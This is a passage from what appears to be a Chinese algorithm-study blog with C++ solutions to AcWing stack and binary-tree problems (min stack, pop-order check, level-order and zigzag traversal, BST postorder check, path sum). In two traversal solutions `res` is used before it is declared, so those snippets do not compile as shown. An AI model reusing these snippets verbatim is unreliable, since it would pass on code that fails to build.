单调栈的栈顶元素，则将该数同时压入单调栈中；否则，不压入，这是由于栈具有先进后出性质，所以在该数被弹出之前，栈中一直存在一个数比该数小，所以该数一定不会被当做最小数输出。</li><li>当我们从栈中弹出一个数时，如果该数等于单调栈的栈顶元素，则同时将单调栈的栈顶元素弹出。</li><li>单调栈由于其具有单调性，所以它的栈顶元素，就是当前栈中的最小数。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MinStack</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  stack&lt;<span class="type">int</span>&gt; stk, min_stk;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">  <span class="built_in">MinStack</span>() &#123;</span><br><span class="line">      </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    stk.<span class="built_in">push</span>(x);</span><br><span class="line">    <span class="comment">// 当 x = min_stk.top() 时也应当push进min_stk</span></span><br><span class="line">    <span class="keyword">if</span> (min_stk.<span class="built_in">empty</span>() || x &lt;= min_stk.<span class="built_in">top</span>()) min_stk.<span class="built_in">push</span>(x);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stk.<span class="built_in">top</span>() == min_stk.<span class="built_in">top</span>()) min_stk.<span class="built_in">pop</span>();</span><br><span class="line">    stk.<span class="built_in">pop</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> stk.<span class="built_in">top</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> min_stk.<span class="built_in">top</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MinStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MinStack obj = new MinStack();</span></span><br><span class="line"><span class="comment"> * obj.push(x);</span></span><br><span class="line"><span class="comment"> * obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.top();</span></span><br><span class="line"><span class="comment"> * int param_4 = obj.getMin();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h2 id="栈的压入、弹出序列★"><a href="https://www.acwing.com/problem/content/40/">栈的压入、弹出序列★</a></h2><p>输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否可能为该栈的弹出顺序。</p><p>假设压入栈的所有数字均不相等。</p><p>例如序列 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">1,2,3,4,5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span></span></span></span> 是某栈的压入顺序，序列 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">4,5,3,2,1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span></span></span></span> 是该压栈序列对应的一个弹出序列，但 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">4,3,5,1,2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span></span></span></span> 就不可能是该压栈序列的弹出序列。</p><p><strong>注意</strong>：若两个序列长度不等则视为并不是一个栈的压入、弹出序列。若两个序列都为空，则视为是一个栈的压入、弹出序列。</p><p><strong>数据范围</strong></p><p>序列长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[1,2,3,4,5]      [4,5,3,2,1]输出：true</code></pre><h3 id="模拟法-2">模拟法</h3><p>栈只有push()和pop()两个操作会影响栈中的数据</p><p>若栈顶元素 = 弹出序列首部, 则必然对应pop(); 否则, 则必然要将数据push进去</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isPopOrder</span><span class="params">(vector&lt;<span class="type">int</span>&gt; pushV,vector&lt;<span class="type">int</span>&gt; popV)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pushV.<span class="built_in">size</span>() != popV.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: pushV) &#123;</span><br><span class="line">      stk.<span class="built_in">push</span>(x);</span><br><span class="line">      <span class="keyword">while</span> (stk.<span class="built_in">size</span>() &amp;&amp; stk.<span class="built_in">top</span>() == popV[index]) &#123;</span><br><span class="line">        stk.<span class="built_in">pop</span>();</span><br><span class="line">        index++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stk.<span class="built_in">empty</span>()? <span class="literal">true</span>: <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="不分行从上往下打印二叉树"><a href="https://www.acwing.com/problem/content/41/">不分行从上往下打印二叉树</a></h2><p>从上往下打印出二叉树的每个结点，同一层的结点按照从左到右的顺序打印。</p><p><strong>数据范围</strong></p><p>树中节点的数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入如下图所示二叉树[8, 12, 2, null, null, 6, null, 4, null, null, null]    8   / \  12  2     /    6   /  4输出：[8, 12, 2, 6, 4]</code></pre><h3 id="BFS">BFS</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">printFromTopToBottom</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> res;</span><br><span class="line">    </span><br><span class="line">    queue&lt;TreeNode*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">      q.<span class="built_in">pop</span>();</span><br><span class="line">      res.<span class="built_in">push_back</span>(t-&gt;val);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (t-&gt;left) q.<span class="built_in">push</span>(t-&gt;left);</span><br><span class="line">      <span class="keyword">if</span> (t-&gt;right) q.<span class="built_in">push</span>(t-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="分行从上往下打印二叉树★"><a href="https://www.acwing.com/problem/content/42/">分行从上往下打印二叉树★</a></h2><p>从上到下按层打印二叉树，同一层的结点按从左到右的顺序打印，每一层打印到一行。</p><p><strong>数据范围</strong></p><p>树中节点的数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入如下图所示二叉树[8, 12, 2, null, null, 6, null, 4, null, null, null]    8   / \  12  2     /    6   /  4输出：[[8], [12, 2], [6], [4]]</code></pre><h3 id="BFS-每层放null">BFS + 每层放null</h3><p>在每层结束处加上null标志, 读到null时意味该层结束, 将该层结果保存, 并且<strong>此时下一层节点已全入队</strong>, 应此再入队下一层标志null</p><p>如果不是null就将当前节点值放入level, 并且左右子树若存则入队</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">printFromTopToBottom</span>(TreeNode* root) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> res;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    queue&lt;TreeNode*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; level;</span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">      q.<span class="built_in">pop</span>();</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (t) &#123;</span><br><span class="line">        level.<span class="built_in">push_back</span>(t-&gt;val);</span><br><span class="line">        <span class="keyword">if</span> (t-&gt;left) q.<span class="built_in">push</span>(t-&gt;left);</span><br><span class="line">        <span class="keyword">if</span> (t-&gt;right) q.<span class="built_in">push</span>(t-&gt;right);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (q.<span class="built_in">size</span>()) q.<span class="built_in">push</span>(<span class="literal">nullptr</span>);</span><br><span class="line">        res.<span class="built_in">push_back</span>(level);</span><br><span class="line">        level.<span class="built_in">clear</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="之字形打印二叉树★"><a href="https://www.acwing.com/problem/content/43/">之字形打印二叉树★</a></h2><p>请实现一个函数按照之字形顺序从上向下打印二叉树。</p><p>即第一行按照从左到右的顺序打印，第二层按照从右到左的顺序打印，第三行再按照从左到右的顺序打印，其他行以此类推。</p><p><strong>数据范围</strong></p><p>树中节点的数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入如下图所示二叉树[8, 12, 2, null, null, 6, 4, null, null, null, null]    8   / \  12  2     / \    6   4输出：[[8], [2, 12], [6, 4]]</code></pre><h3 id="BFS-每层补充null-flag翻转每层结果">BFS + 每层补充null + flag翻转每层结果</h3><blockquote><p>在将level压入到res前，进行<code>reverse(level.begin(), level.end())</code>是最便捷的。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">printFromTopToBottom</span>(TreeNode* root) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> res;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">    </span><br><span class="line">    queue&lt;TreeNode*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; level;</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">      q.<span class="built_in">pop</span>();</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (t) &#123;</span><br><span class="line">        level.<span class="built_in">push_back</span>(t-&gt;val);</span><br><span class="line">        <span class="keyword">if</span> (t-&gt;left) q.<span class="built_in">push</span>(t-&gt;left);</span><br><span class="line">        <span class="keyword">if</span> (t-&gt;right) q.<span class="built_in">push</span>(t-&gt;right);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (q.<span class="built_in">size</span>()) q.<span class="built_in">push</span>(<span class="literal">nullptr</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag) <span class="built_in">reverse</span>(level.<span class="built_in">begin</span>(), level.<span class="built_in">end</span>());</span><br><span class="line">        flag = !flag;</span><br><span class="line">        res.<span class="built_in">push_back</span>(level);</span><br><span class="line">        level.<span class="built_in">clear</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Week-4">Week 4</h1><h2 id="二叉搜索树的后序遍历序列"><a href="https://www.acwing.com/problem/content/44/">二叉搜索树的后序遍历序列</a></h2><p>输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历的结果。</p><p>如果是则返回true，否则返回false。</p><p>假设输入的数组的任意两个数字都互不相同。</p><p><strong>数据范围</strong></p><p>数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[4, 8, 6, 12, 16, 14, 10]输出：true</code></pre><h3 id="递归法-4">递归法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; seq_;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">verifySequenceOfBST</span><span class="params">(vector&lt;<span class="type">int</span>&gt; sequence)</span> </span>&#123;</span><br><span class="line">    seq_ = sequence;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dfs</span>(<span class="number">0</span>, seq_.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> k = l;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; r &amp;&amp; seq_[k] &lt; seq_[r]) k++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = k; i &lt; r; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (seq_[i] &lt;= seq_[r]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dfs</span>(l, k - <span class="number">1</span>) &amp;&amp; <span class="built_in">dfs</span>(k, r - <span class="number">1</span>);  <span class="comment">// k是右子树起点</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="二叉树中和为某一值的路径★"><a href="https://www.acwing.com/problem/content/45/">二叉树中和为某一值的路径★</a></h2><p>输入一棵二叉树和一个整数，打印出二叉树中结点值的和为输入整数的所有路径。</p><p>从树的根结点开始往下一直到叶结点所经过的结点形成一条路径。</p><p>保证树中结点值均不小于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>。</p><p><strong>数据范围</strong></p><p>树中结点的数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>给出二叉树如下所示，并给出num=22。      5     / \    4   6   /   / \  12  13  6 /  \    / \9    1  5   1输出：[[5,4,12,1],[5,6,6,5]]</code></pre><h3 id="递归法-5">递归法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res_;</span><br><span class="line">  </span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">findPath</span>(TreeNode* root, <span class="type">int</span> sum) &#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; path;</span><br><span class="line">    <span class="built_in">dfs</span>(root, sum, path);</span><br><span class="line">    <span class="keyword">return</span> res_;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode *root, <span class="type">int</span> sum, vector&lt;<span class="type">int</span>&gt; &amp;path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// if (!root &amp;&amp; !sum) res_.push_back(path);  // 不能放这, 叶子节点的2个null儿子都会触发</span></span><br><span class="line">    path.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">    sum -= root-&gt;val;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!sum &amp;&amp; !root-&gt;left &amp;&amp; !root-&gt;right) res_.<span class="built_in">push_back</span>(path);</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;left, sum, path);</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;right, sum, path);</span><br><span class="line">    </span><br><span class="line">    path.<span class="built_in">pop_back</span>();</span><br><span class="line">    sum += root-&gt;val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="复杂链表的复刻★"><a href="https://www.acwing.com/problem/content/89/">复杂链表的复刻★</a></h2><p>请实现一个函数可以复制一个复杂链表。</p><p>在复杂链表中，每个结点除了有一个指针指向下一个结点外，还有一个额外的指针指向链表中的任意结点或者null。</p><p><strong>注意</strong>：</p><ul><li>函数结束后原链表要与输入时保持一致。</li></ul><p><strong>数据范围</strong></p><p>链表长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>。</p><h3 id="法1-hash表法-推荐">法1 